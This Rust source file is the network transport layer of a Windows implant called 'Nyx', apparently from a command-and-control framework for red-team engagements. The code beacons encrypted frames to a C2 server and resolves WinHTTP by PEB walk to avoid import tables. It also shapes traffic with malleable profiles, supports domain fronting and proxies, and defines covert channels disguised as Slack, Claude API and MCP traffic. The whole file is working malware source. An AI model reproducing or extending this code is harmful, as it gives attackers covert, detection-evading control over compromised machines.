//! WinHTTP transport for the PIC implant.
//!
//! `no_std` can't use `ureq`/`rquest` (they're std), so beacon HTTP goes through
//! Win32 WinHTTP -- resolved via PEB walk (no IAT). Sends an encrypted frame as
//! an HTTP POST body and reads the response.
//!
//! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
//! TLS is selected per-build via the `use_tls` config flag: when set,
//! `WinHttpOpenRequest` is given `WINHTTP_FLAG_SECURE` (0x00800000) so the
//! request is sent over HTTPS. Certificate errors are HARD FAILURES by default
//! (returns None immediately — operators MUST use valid CA-signed certs or
//! domain fronting). The legacy cert-ignore retry is opt-in via
//! `NYX_TLS_INSECURE=1` at build time; engagements SHOULD NOT set this in
//! production.

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;

/// Nyx C2 channel type — selects transport protocol.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum Channel {
    Https = 0,    // Direct HTTPS POST to C2 server (default)
    DohDns = 1,   // DNS-over-HTTPS tunneling
    SlackApi = 2, // Slack Bot API as external C2
    LlmApi = 3,   // Anthropic Claude API as cover
    Mcp = 4,      // Model Context Protocol JSON-RPC
    WebTrans = 5, // WebTransport over QUIC (future)
    SmbPipe = 6,  // SMB Named Pipe (internal lateral)
}

static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0); // default = HTTPS

pub fn set_channel(ch: Channel) {
    CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release);
}
pub fn get_channel() -> Channel {
    match CURRENT_CHANNEL.load(core::sync::atomic::Ordering::Acquire) {
        0 => Channel::Https,
        1 => Channel::DohDns,
        2 => Channel::SlackApi,
        3 => Channel::LlmApi,
        4 => Channel::Mcp,
        5 => Channel::WebTrans,
        _ => Channel::SmbPipe,
    }
}

/// Channel-specific path routing through WinHTTP.
pub unsafe fn channel_post_frame(
    host: &[u8],
    port: u16,
    body: &[u8],
    use_tls: bool,
) -> Option<Vec<u8>> {
    let ch = get_channel();
    let path: &[u8] = match ch {
        Channel::Https => b"/beacon",
        Channel::DohDns => b"/dns",
        Channel::SlackApi => b"/slack",
        Channel::LlmApi => b"/llm",
        Channel::Mcp => b"/mcp",
        Channel::WebTrans => b"/beacon",
        Channel::SmbPipe => return None,
    };
    post_frame(host, port, path, body, use_tls)
}

pub fn channel_name(ch: Channel) -> &'static str {
    match ch {
        Channel::Https => "https",
        Channel::DohDns => "doh-dns",
        Channel::SlackApi => "slack-api",
        Channel::LlmApi => "llm-api",
        Channel::Mcp => "mcp",
        Channel::WebTrans => "webtransport",
        Channel::SmbPipe => "smb-pipe",
    }
}
/// WinHttpOpenRequest flag: use TLS (HTTPS). When set, WinHTTP performs the
/// TLS handshake and encrypts the body — the plaintext-HTTP IOC (and the
/// readable beacon frame on the wire) disappears.
const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;

/// WinHttpSetOption option code: control certificate validation behavior.
const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31; // 0x1F, not 32
/// Flags OR'd into WINHTTP_OPTION_SECURITY_FLAGS to ignore cert errors the
/// redirector/self-signed infra would otherwise trip. Engagement-only: this
/// trusts whatever cert the server presents, so MITM is possible — acceptable
/// when the operator controls the redirector path.
const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x0000_0100;
const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x0000_2000;
const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;

/// Maximum total response body size in bytes. A malicious server (or MitM)
/// could send an unlimited response body to exhaust the implant's bump
/// allocator (which has limited virtual memory). 16 MiB is generous enough
/// for any legitimate beacon task response while capping the OOM surface.
const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;

/// Const-eval flag: when `NYX_TLS_INSECURE=1` is set at build time, TLS
/// certificate errors are retried with relaxed validation (ignore unknown CA,
/// date, CN). Default (no env or any other value): cert failure returns None
/// immediately — operators MUST use valid CA-signed certs or domain fronting.
const fn tls_insecure_retry() -> bool {
    match option_env!("NYX_TLS_INSECURE") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// WinHTTP function pointer table (resolved lazily, cached in statics).
struct WinhttpFns {
    open: FOpen,
    connect: FConnect,
    open_request: FOpenReq,
    /// Optional: only needed to relax cert validation for TLS w/ self-signed
    /// redirector. None ⇒ TLS still works for valid-CA certs.
    set_option: Option<FSetOption>,
    send_request: FSendReq,
    receive_response: FRecvResp,
    read_data: FReadData,
    close_handle: FClose,
    query_data: FQueryData,
    /// Optional: WinHttpAddRequestHeaders — only needed when the profile's
    /// client block declares static headers or a header-terminator (data rides
    /// in a header instead of the body). None ⇒ headers silently skipped.
    add_request_headers: Option<FAddReqHeaders>,
}

type HINTERNET = *mut c_void;
type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type FOpenReq = unsafe extern "system" fn(
    HINTERNET,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const *const u16,
    u32,
    u32,
) -> HINTERNET;
/// WinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength) -> BOOL.
/// Used to relax certificate validation for self-signed redirectors.
type FSetOption = unsafe extern "system" fn(HINTERNET, u32, *const u8, u32) -> i32;
type FSendReq =
    unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;
type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
/// WinHttpAddRequestHeaders(hRequest, pwszHeaders, dwHeadersLength, dwModifiers) -> BOOL.
/// Adds (or replaces) HTTP request headers. Used for the profile's client-block
/// static headers and for a header-terminator (transformed bytes in a header).
type FAddReqHeaders = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;
/// WinHTTP function table, stored as a raw pointer in an AtomicUsize.
/// 0 = uninitialized, 1 = init failed (winhttp.dll unavailable),
/// otherwise = pointer to a leaked `WinhttpFns`.
static WINHTTP: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Resolve the WinHTTP function table once (no allocation).
pub unsafe fn ensure_winhttp() {
    use core::sync::atomic::Ordering;
    // Fast path: already attempted (success or failure).
    let cur = WINHTTP.load(Ordering::Acquire);
    if cur != 0 {
        return;
    }
    // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
    // kernel32 and force-load it into the process first.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let lla = export_addr(b"kernel32.dll", b"LoadLibraryA");
    let mut winhttp_loaded = false;
    if let Some(addr) = lla {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"winhttp.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            winhttp_loaded = true;
        }
    }
    if !winhttp_loaded {
        // Can't load winhttp — mark as failed (sentinel 1) so we don't retry.
        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        return;
    }
    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
    // WinHttpSetOption is optional — only needed when TLS is on and the
    // redirector presents a self-signed cert. If it's absent, TLS still works
    // against valid CAs; we just can't relax cert checking.
    let so = export_addr(b"winhttp.dll", b"WinHttpSetOption");
    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
    // Optional: WinHttpAddRequestHeaders (client-block headers / header terminator).
    let arh = export_addr(b"winhttp.dll", b"WinHttpAddRequestHeaders");
    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
        (o, c, r, s, v, d, cl, q)
    {
        let fns = alloc::boxed::Box::new(WinhttpFns {
            open: core::mem::transmute(o),
            connect: core::mem::transmute(c),
            open_request: core::mem::transmute(r),
            // set_option may be None — handled in post_frame (only called for TLS).
            set_option: match so {
                Some(a) => Some(core::mem::transmute(a)),
                None => None,
            },
            send_request: core::mem::transmute(s),
            receive_response: core::mem::transmute(v),
            read_data: core::mem::transmute(d),
            close_handle: core::mem::transmute(cl),
            query_data: core::mem::transmute(q),
            add_request_headers: match arh {
                Some(a) => Some(core::mem::transmute(a)),
                None => None,
            },
        });
        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
        // One-time install. If we lost the race, free our allocation.
        match WINHTTP.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
            Ok(_) => {}
            Err(_) => {
                drop(alloc::boxed::Box::from_raw(ptr as *mut WinhttpFns));
            }
        }
    } else {
        // Export resolution failed — mark as failed.
        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
    }
}

/// Convert an ASCII byte string to a UTF-16 buffer (null-terminated) for WinHTTP.
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Send `body` as an HTTP POST to `host:port/path` and return the response
/// body. `use_tls` selects HTTPS (WINHTTP_FLAG_SECURE). By default, certificate
/// errors are HARD FAILURES (returns None — operators MUST use valid CA-signed
/// certs or domain fronting). The legacy cert-ignore retry (via WinHttpSetOption)
/// is opt-in: set `NYX_TLS_INSECURE=1` at build time.
pub unsafe fn post_frame(
    host: &[u8],
    port: u16,
    path: &[u8],
    body: &[u8],
    use_tls: bool,
) -> Option<Vec<u8>> {
    ensure_winhttp();
    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
    // 0 = not attempted, 1 = init failed. Both mean no transport available.
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
    // for the process lifetime and is never freed.
    let fns = unsafe { &*(ptr as *const WinhttpFns) };
    // User-agent: the profile's `set useragent` (baked at build) overrides the
    // transport default. CS's default beacon UA is a well-known IOC, so a real
    // engagement sets one in the profile.
    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
        b"Mozilla/5.0"
    } else {
        crate::envelopes::POST_CLIENT_UA
    };
    let ua = to_utf16(ua_bytes);
    // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
    let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() {
        return None;
    }
    let host16 = to_utf16(host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }
    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    // WinHttpOpenRequest: WINHTTP_FLAG_SECURE (0x00800000) when use_tls, else 0.
    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        secure_flag,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // ---- Envelope shaping (profile-driven, done BEFORE send) ----
    let csteps = crate::envelopes::post_client_steps();
    let cterm = crate::envelopes::post_client_terminator();
    let cheaders = crate::envelopes::post_client_headers();
    let shaped = nyx_profile::encode(&csteps, body);
    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
        Some(nyx_profile::Terminator::Header(name)) => {
            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
        }
        _ => (shaped, None),
    };

    // Collect static client-block headers + (if header-terminator) the data header.
    if let Some(add_req_headers) = fns.add_request_headers {
        let mut hdr: Vec<u8> = Vec::new();
        for &(n, v) in cheaders.iter() {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        if let Some((n, v)) = &data_header {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        if !hdr.is_empty() {
            let hdr16 = to_utf16(&hdr);
            let hdr_len = (hdr16.len() - 1) as u32;
            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
        }
    }

    // ---- WinHttpSendRequest with optional TLS cert-ignore ----
    // Default: strict cert validation — failure returns None immediately.
    // When NYX_TLS_INSECURE=1 is set at build time, relax cert validation
    // BEFORE the first send (WinHTTP requires SECURITY_FLAGS set before
    // WinHttpSendRequest; setting them after a failed send is rejected or
    // silently ignored, so the old post-failure retry never actually relaxed).
    // NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
    let can_relax_cert = use_tls && fns.set_option.is_some() && tls_insecure_retry();
    if can_relax_cert {
        let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        let set_opt = match fns.set_option {
            Some(f) => f,
            None => return None,
        };
        if set_opt(
            req,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &tls_flags as *const u32 as *const u8,
            4,
        ) == 0
        {
            // Could not set relaxation flags — abort rather than send strict.
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
    }
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        wire_body.as_ptr(),
        wire_body.len() as u32,
        wire_body.len() as u32,
        0,
    );
    if ok == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // WinHttpReceiveResponse.
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // Read the response body.
    let mut out: Vec<u8> = Vec::new();
    #[allow(unused_assignments)]
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        // Cap the per-read buffer (and the bytes we ask WinHTTP to fill) at
        // 1 MiB. CRITICAL: dwNumberOfBytesToRead MUST be `capped`, not `avail` —
        // passing the uncapped `avail` (a server/MitM-influenced value) told
        // WinHTTP it could write up to `avail` bytes into a 1 MiB buffer → heap
        // overflow when `avail > 1 << 20`. Clamp `read` to `capped` before
        // slicing too, since read can't exceed what we asked for but we defend
        // in depth against a misbehaving stack.
        let capped = (avail as usize).min(1 << 20);
        let mut chunk = vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        // Guard: reject the entire response if accumulated size would exceed
        // the cap. The bump allocator maps a fixed virtual region; letting a
        // malicious server push past the limit risks OOM / process death.
        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
            // Discard all accumulated data and signal a clean transport error
            // to the caller. Returning partial ciphertext would cause decryption
            // / frame-parse failures rather than a clean retry.
            // CRITICAL: close all three WinHTTP handles before returning — the
            // original `return None` here leaked req/conn/session.
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
        out.extend_from_slice(&chunk[..n]);
    }
    // Invert the http-post SERVER envelope (the response direction). The team
    // server applied `shape_beacon_response` (print/none/uri-append → bytes in
    // the body; header → a response header the implant doesn't read yet). With
    // no profile the steps are empty and this is a no-op. On decode failure keep
    // the raw bytes so the frame parse fails loudly instead of silently dropping.
    let ssteps = crate::envelopes::post_server_steps();
    if !ssteps.is_empty() {
        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
            out = decoded;
        }
    }
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Enhanced POST with proxy + domain fronting (spec-7)
// ══════════════════════════════════════════════════════════════════════════════

/// WinHTTP access type: named proxy (explicit proxy server configured).
const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;

/// Optional HTTP enhancements for domain fronting and proxy support.
///
/// When `fronting_host` is non-empty, it overrides the HTTP `Host:` header —
/// the TCP connection still goes to `connect_host`, but the TLS SNI and HTTP
/// Host header say `fronting_host`. This is the domain-fronting technique:
/// connect to a CDN IP, present a legitimate domain's SNI, but the CDN routes
/// to the real backend via the Host header.
///
/// When `proxy_url` is non-empty (format `"host:port"`), WinHTTP routes the
/// request through that proxy instead of using the system default. Optional
/// `proxy_username` / `proxy_password` provide basic-auth credentials.
pub struct HttpOpts<'a> {
    /// The Host header value for domain fronting. Empty = use connect_host.
    pub fronting_host: &'a [u8],
    /// Proxy server as `"host:port"` UTF-8 bytes. Empty = no explicit proxy.
    pub proxy_url: &'a [u8],
}

/// Enhanced POST with domain-fronting Host header and explicit proxy support.
///
/// This is a full re-implementation of the WinHTTP call chain (not a wrapper
/// around `post_frame`) because `WinHttpOpen`'s proxy access type and the
/// fronting Host header must be set BEFORE the request is sent — they can't
/// be bolted on after. The envelope shaping, TLS cert handling, and response
/// reading logic mirror `post_frame` exactly.
pub unsafe fn post_frame_enhanced(
    connect_host: &[u8],
    port: u16,
    path: &[u8],
    body: &[u8],
    use_tls: bool,
    opts: &HttpOpts<'_>,
) -> Option<Vec<u8>> {
    ensure_winhttp();
    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
    // for the process lifetime and is never freed.
    let fns = unsafe { &*(ptr as *const WinhttpFns) };

    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
        b"Mozilla/5.0"
    } else {
        crate::envelopes::POST_CLIENT_UA
    };
    let ua = to_utf16(ua_bytes);

    // ---- WinHttpOpen with proxy if configured ----
    // When proxy_url is set, use WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass
    // the proxy as the lpszProxy parameter. Otherwise use DEFAULT_PROXY (0),
    // same as the plain post_frame path.
    let (access_type, proxy_w) = if opts.proxy_url.is_empty() {
        (0u32, None::<Vec<u16>>)
    } else {
        let pw = to_utf16(opts.proxy_url);
        (WINHTTP_ACCESS_TYPE_NAMED_PROXY, Some(pw))
    };
    let session = match &proxy_w {
        Some(pw) => (fns.open)(
            ua.as_ptr(),
            access_type,
            pw.as_ptr(),
            core::ptr::null(),
            0,
        ),
        None => (fns.open)(
            ua.as_ptr(),
            access_type,
            core::ptr::null(),
            core::ptr::null(),
            0,
        ),
    };
    if session.is_null() {
        return None;
    }

    // ---- WinHttpConnect to the actual connect_host (CDN IP or redirector) ----
    let host16 = to_utf16(connect_host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }

    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        secure_flag,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }

    // ---- Envelope shaping (same as post_frame) ----
    let csteps = crate::envelopes::post_client_steps();
    let cterm = crate::envelopes::post_client_terminator();
    let cheaders = crate::envelopes::post_client_headers();
    let shaped = nyx_profile::encode(&csteps, body);
    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
        Some(nyx_profile::Terminator::Header(name)) => {
            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
        }
        _ => (shaped, None),
    };

    // ---- Collect headers: profile static + data-header + fronting Host ----
    if let Some(add_req_headers) = fns.add_request_headers {
        let mut hdr: Vec<u8> = Vec::new();
        // Profile-declared static headers.
        for &(n, v) in cheaders.iter() {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        // Header-terminator data.
        if let Some((n, v)) = &data_header {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        // Domain fronting: override the Host header. WinHttpAddRequestHeaders
        // with WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000) replaces the
        // auto-generated Host: <connect_host> with the fronting domain.
        if !opts.fronting_host.is_empty() {
            hdr.extend_from_slice(b"Host: ");
            hdr.extend_from_slice(opts.fronting_host);
            hdr.extend_from_slice(b"\r\n");
        }
        if !hdr.is_empty() {
            let hdr16 = to_utf16(&hdr);
            let hdr_len = (hdr16.len() - 1) as u32;
            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
        }
    }

    // ---- Send request (with cert-ignore, same pre-send approach as post_frame) ----
    let can_relax_cert = use_tls && fns.set_option.is_some() && tls_insecure_retry();
    if can_relax_cert {
        let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        let set_opt = match fns.set_option {
            Some(f) => f,
            None => return None,
        };
        if set_opt(
            req,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &tls_flags as *const u32 as *const u8,
            4,
        ) == 0
        {
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
    }
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        wire_body.as_ptr(),
        wire_body.len() as u32,
        wire_body.len() as u32,
        0,
    );
    if ok == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }

    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }

    // ---- Read response (same bounded-read logic as post_frame) ----
    let mut out: Vec<u8> = Vec::new();
    #[allow(unused_assignments)]
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        let capped = (avail as usize).min(1 << 20);
        let mut chunk = crate::heap::vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
        out.extend_from_slice(&chunk[..n]);
    }

    // Invert server envelope (same as post_frame).
    let ssteps = crate::envelopes::post_server_steps();
    if !ssteps.is_empty() {
        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
            out = decoded;
        }
    }
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}
